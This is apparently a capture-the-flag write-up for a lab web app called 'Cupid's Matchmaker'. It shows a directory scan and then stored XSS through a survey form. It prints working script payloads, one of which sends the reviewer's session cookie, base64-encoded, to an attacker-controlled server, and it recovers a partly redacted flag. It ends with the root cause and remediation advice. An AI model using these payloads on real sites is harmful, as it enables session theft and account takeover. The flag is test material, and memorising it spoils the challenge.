# Cupid's Matchmaker

> My Dearest Hacker,
>
> Tired of soulless algorithms? At Cupid's Matchmaker, real humans read your personality survey and personally match you with compatible singles. Our dedicated matchmaking team reviews every submission to ensure you find true love this Valentine's Day! 💘 No algorithms. No bots. Just genuine human connection.

**Target:** `http://10.81.170.118:5000`

## Objective

Find the flag.

## Recon

Manually crawling the site, I found a "Survey" page. I then ran a directory scan to enumerate hidden paths:

```bash
gobuster dir -w raft-medium-words.txt -u http://10.81.170.118:5000 -x php,txt,html
```

This turned up an admin login page as well.

Since a human reportedly reviews every survey submission, the Survey page looked like a strong candidate for a stored XSS attack — if an "admin" opens submissions and views them, any script I inject could run in their browser session.

## Exploitation

**Step 1 — Confirm XSS execution**

I started a local listener:

```bash
python3 -m http.server 8000
```

...and submitted the following payload in the survey form:

```html
<script>fetch('http://192.168.132.61:5555/test');</script>
```

The request hit my listener, confirming the payload executes when the submission is reviewed.

**Step 2 — Steal the admin's session cookie**

Next, I submitted a payload to exfiltrate the cookie to my server, base64-encoded:

```html
<script>fetch('http://192.168.132.61:8000/?cookie=' + btoa(document.cookie));</script>
```

Shortly after, my server received a hit with the following cookie value:

```
ZmxhZz1USE17WFNT#################M3NfQWc0MW59
```

**Step 3 — Decode the flag**

The value was base64-encoded. Decoding it revealed the flag directly:

```
flag=THM{XSS_xxxxxxxx_Ag41n}
```

## Flag

```
THM{XSS_xxxxxxxx_Ag41n}
```

## Summary

The Survey feature was vulnerable to stored XSS. An attacker-controlled `<script>` payload submitted through the form executed in the context of whoever reviewed submissions (the "admin"), allowing exfiltration of their session cookie, which contained the flag base64-encoded.

**Root cause:** user-supplied survey input was rendered without sanitization/escaping in the admin review view.

**Remediation:** HTML-encode user input on output, apply a Content-Security-Policy restricting script sources, and set the session cookie as `HttpOnly` to prevent JavaScript access.
